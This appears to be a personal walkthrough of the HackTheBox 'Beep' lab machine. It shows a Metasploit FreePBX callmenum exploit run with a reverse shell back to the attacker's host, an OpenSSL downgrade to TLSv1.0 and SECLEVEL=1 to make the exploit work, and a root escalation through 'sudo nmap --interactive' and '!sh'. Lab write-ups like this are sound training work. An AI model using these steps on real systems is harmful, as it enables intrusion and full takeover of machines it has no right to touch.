---
title: "HackTheBox：Beep笔记"
slug: re3uva
translationKey: re3uva
date: 2020-05-25T01:40:15+08:00
source: yuque/penetration
---

## elastix
![](https://cdn.nlark.com/yuque/0/2020/png/166008/1590342051488-5f1b2b4e-e643-47ad-b8d1-92e70849ad3a.png)



```sql
msf5 exploit(unix/http/freepbx_callmenum) > show options 

Module options (exploit/unix/http/freepbx_callmenum):

   Name       Current Setting      Required  Description
   ----       ---------------      --------  -----------
   EXTENSION  230-240              yes       A range of Local extension numbers
   Proxies    http:127.0.0.1:8080  no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     10.10.10.7           yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      443                  yes       The target port (TCP)
   SSL        true                 no        Negotiate SSL/TLS for outgoing connections
   VHOST                           no        HTTP server virtual host


Payload options (cmd/unix/reverse):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.16.122     yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target


msf5 exploit(unix/http/freepbx_callmenum) > run

[*] Started reverse TCP double handler on 10.10.16.122:4444 
[*] 10.10.10.7:443 - Sending evil request with range 230
[*] 10.10.10.7:443 - Sending evil request with range 231
[*] 10.10.10.7:443 - Sending evil request with range 232
[*] 10.10.10.7:443 - Sending evil request with range 233
[*] 10.10.10.7:443 - Sending evil request with range 234
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo qaF1oILSz5kNCclV;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket B
[*] B: "qaF1oILSz5kNCclV\r\n"
[*] Matching...
[*] A is input...
[*] Command shell session 1 opened (10.10.16.122:4444 -> 10.10.10.7:39534) at 2020-05-25 01:37:26 +0800

```





## issue to fix
set ssl true

**issue**

```sql
msf5 exploit(unix/http/freepbx_callmenum) > run

[*] Started reverse TCP double handler on 10.10.16.122:4444 
[*] 10.10.10.7:443 - Sending evil request with range 200
[*] 10.10.10.7:443 - Sending evil request with range 201
^C[-] Exploit failed [user-interrupt]: Interrupt 
[-] run: Interrupted
msf5 exploit(unix/http/freepbx_callmenum) > show options Interrupt: use the 'exit' command to quit

```

OPENSSL too new, auto discard low versio df key.



**solution**

```sql
# use burp to proxy 
set proxies http:127.0.0.1:8080
set ReverseAllowProxy true

or use it(unused)

sed -i 's,^\(MinProtocol[ ]*=\).*,\1'TLSv1.0',g' /etc/ssl/openssl.cnf 
$ sed -i 's,^\(CipherString[ ]*=\).*,\1'DEFAULT@SECLEVEL=1',g' /etc/ssl/openssl.cnf
```

# 提权
查看信息

```sql
sudo -l
Matching Defaults entries for asterisk on this host:
    env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR
    LS_COLORS MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE LC_COLLATE
    LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES LC_MONETARY LC_NAME LC_NUMERIC
    LC_PAPER LC_TELEPHONE LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET
    XAUTHORITY"

User asterisk may run the following commands on this host:
    (root) NOPASSWD: /sbin/shutdown
    (root) NOPASSWD: /usr/bin/nmap
    (root) NOPASSWD: /usr/bin/yum
    (root) NOPASSWD: /bin/touch
    (root) NOPASSWD: /bin/chmod
    (root) NOPASSWD: /bin/chown
    (root) NOPASSWD: /sbin/service
    (root) NOPASSWD: /sbin/init
    (root) NOPASSWD: /usr/sbin/postmap
    (root) NOPASSWD: /usr/sbin/postfix
    (root) NOPASSWD: /usr/sbin/saslpasswd2
    (root) NOPASSWD: /usr/sbin/hardware_detector
    (root) NOPASSWD: /sbin/chkconfig
    (root) NOPASSWD: /usr/sbin/elastix-helper

```

发现个nmap，交互式直接得shell，开冲

```sql
# id
# uid=100(asterisk) gid=101(asterisk)
# sudo nmap --interactive

# Starting Nmap V. 4.11 ( http://www.insecure.org/nmap/ )
# Welcome to Interactive Mode -- press h <enter> for help
# nmap> !sh
# id
# uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)

```

ref

+ [https://github.com/rapid7/metasploit-framework/issues/6783](https://github.com/rapid7/metasploit-framework/issues/6783)
+ [https://blog.csdn.net/fastergohome/article/details/104165920](https://blog.csdn.net/fastergohome/article/details/104165920)





